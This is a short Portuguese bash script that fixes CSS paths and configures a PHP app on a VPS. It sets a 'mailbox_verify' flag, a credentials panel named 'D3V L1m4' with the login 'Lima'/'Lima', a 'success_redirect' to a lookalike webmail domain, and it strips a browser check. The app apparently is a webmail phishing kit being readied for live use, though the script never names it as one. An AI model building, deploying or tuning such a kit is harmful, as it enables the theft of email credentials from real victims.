#!/bin/bash
# Corrige CSS/imagens quebrados em http://IP/teste/ (paths /skins → /teste/skins)
# Na VPS: sudo bash /var/www/html/teste/deploy/fix-teste-paths.sh

set -euo pipefail

APP_DIR="/var/www/html/teste"

if [[ "${EUID}" -ne 0 ]]; then
  echo "Execute com sudo."
  exit 1
fi

if [[ ! -d "${APP_DIR}/public" ]]; then
  echo "ERRO: ${APP_DIR}/public não encontrado."
  exit 1
fi

echo "==> url_prefix => /teste, mailbox_verify, painel Lima..."
CFG="${APP_DIR}/config.local.php"
if [[ -f "${CFG}" ]]; then
  if grep -q "'url_prefix'" "${CFG}"; then
    sed -i "s|'url_prefix'[[:space:]]*=>[[:space:]]*'[^']*'|'url_prefix' => '/teste'|" "${CFG}"
  fi
  if grep -q "'mailbox_verify'" "${CFG}"; then
    sed -i "s|'mailbox_verify'[[:space:]]*=>[[:space:]]*[^,]*|'mailbox_verify' => true|" "${CFG}"
  fi
  if grep -q "'panel_name'" "${CFG}"; then
    sed -i "s|'panel_name'[[:space:]]*=>[[:space:]]*'[^']*'|'panel_name' => 'D3V L1m4'|" "${CFG}"
  fi
  if grep -q "'panel_user'" "${CFG}"; then
    sed -i "s|'panel_user'[[:space:]]*=>[[:space:]]*'[^']*'|'panel_user' => 'Lima'|" "${CFG}"
    sed -i "s|'panel_pass'[[:space:]]*=>[[:space:]]*'[^']*'|'panel_pass' => 'Lima'|" "${CFG}"
  fi
  if grep -q "'success_redirect'" "${CFG}"; then
    sed -i "s|'success_redirect'[[:space:]]*=>[[:space:]]*'[^']*'|'success_redirect' => 'https://webmail-seguro.com.br/'|" "${CFG}"
  fi
else
  cat > "${CFG}" <<'EOF'
<?php
declare(strict_types=1);
$cfg = require __DIR__ . '/config.example.php';
$cfg['env'] = 'production';
$cfg['url_prefix'] = '/teste';
$cfg['mailbox_verify'] = true;
$cfg['data_dir'] = __DIR__ . '/var/data';
$cfg['panel_user'] = 'Lima';
$cfg['panel_pass'] = 'Lima';
$cfg['panel_name'] = 'D3V L1m4';
$cfg['allow_credentials_list'] = false;
$cfg['success_redirect'] = 'https://webmail-seguro.com.br/';
return $cfg;
EOF
  chmod 644 "${CFG}"
fi

echo "==> Remove bloqueio de navegador (se existir)..."
IDX="${APP_DIR}/public/index.php"
if [[ -f "${IDX}" ]] && grep -q 'lm_browser_supported' "${IDX}"; then
  sed -i '/if (!lm_browser_supported())/,/^}$/d' "${IDX}"
fi

echo "==> Reiniciando Apache..."
systemctl restart apache2

IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
echo ""
echo "Pronto. Abra: http://${IP:-191.252.209.28}/teste/"
echo "CSS deve carregar em /teste/skins/... (não mais /skins/...)"
